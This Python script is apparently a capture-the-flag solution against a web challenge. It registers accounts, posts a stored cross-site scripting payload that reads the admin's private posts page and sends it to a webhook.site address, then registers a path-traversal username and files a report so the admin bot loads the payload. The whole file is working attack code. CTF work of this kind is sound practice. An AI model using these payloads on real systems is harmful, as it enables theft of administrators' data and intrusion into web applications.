import requests, sys, random, string

url = 'http://challs.tfcctf.com:30706/'
USERNAME = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
print("USERNAME:", USERNAME)
PASSWORD = "brunnerne"

# Register
s = requests.session()
r = s.post(url + 'api/register', json={'username': USERNAME, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to register")
    sys.exit(1)
print(r.json())
# Login
r = s.post(url + 'api/login', json={'username': USERNAME, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to login")
    sys.exit(1)
print(r.json())
# Create post
## Empty title to trigger exception for admin at /posts
PAYLOAD = """
<script>
  fetch("http://localhost:1337/posts/view/admin").then((response) =>
    response.text().then((resp) => {
      fetch(
        "https://webhook.site/2b970bec-3093-4e24-959b-5ede0da83614?" +
          encodeURIComponent(resp)
      );
    })
  );
</script>
"""
r = s.post(url + 'api/posts', json={'content': PAYLOAD, 'hidden': False})

if r.status_code != 200:
    print("Failed to create post")
    sys.exit(1)
print(r.json())

# Create User with path traversal
USERNAME_PAYLOAD = "..\\..\\..\\..\\..\\..\\posts"
r = s.post(url + 'api/register', json={'username': USERNAME_PAYLOAD, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to register user with path traversal")
    sys.exit(1)
print(r.json())

# Login as path traversal user
r = s.post(url + 'api/login', json={'username': USERNAME_PAYLOAD, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to login as path traversal user")
    sys.exit(1)
print(r.json())

# Report user
r = s.post(url + 'api/report')

if r.status_code != 200:
    print("Failed to report user")
    sys.exit(1)
print(r.json())
